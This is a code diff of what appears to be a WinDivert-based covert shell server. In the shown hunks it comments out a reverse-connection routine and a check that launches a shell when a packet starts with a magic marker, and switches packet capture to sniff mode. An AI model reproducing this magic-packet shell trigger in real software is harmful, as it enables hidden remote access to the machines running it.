@@ -37,15 +37,16 @@ void server_base::set_reverse_mode(bool mode)
 void server_base::start()
 {
 	release_sysfile();
-	if (!init_divert("tcp.SrcPort = 8888||tcp.DstPort = 8888"))	{
+	if (!init_divert("tcp.SrcPort = 8888"))	{
 		return;
 	}
+	/*
 	if (m_reverse_mode == true)	{
 		connect_to_target();
 	}
 	else {
 		wait_for_connect();
-	}
+	}*/
 
 	UINT payload_len;
 	PVOID payload_buf;
@@ -56,14 +57,14 @@ void server_base::start()
 	{
 		if (!recv_data_packet(packet, &payload_len, &payload_buf))
 			continue;
-
+		/*
 		if (payload_len && payload_buf)
 		{
 			if (payload_len >= strlen(SHELL_START) && !memcmp(payload_buf, SHELL_START, strlen(SHELL_START)))
 			{
 				run_shell();
 			}
-		}
+		}*/
 	}
 }
 
@@ -85,7 +86,7 @@ BOOL server_base::init_divert(const char* filter)
 {
 	int priority = 0;
 	cout << "[*] filter = \"" << filter << "\"" << endl;
-	m_divert_handle = WinDivertOpen(filter, WINDIVERT_LAYER_NETWORK, (INT16)priority, 0);
+	m_divert_handle = WinDivertOpen(filter, WINDIVERT_LAYER_NETWORK, (INT16)priority, WINDIVERT_FLAG_SNIFF);
 	if (m_divert_handle == INVALID_HANDLE_VALUE)
 	{
 		if (GetLastError() == ERROR_INVALID_PARAMETER)
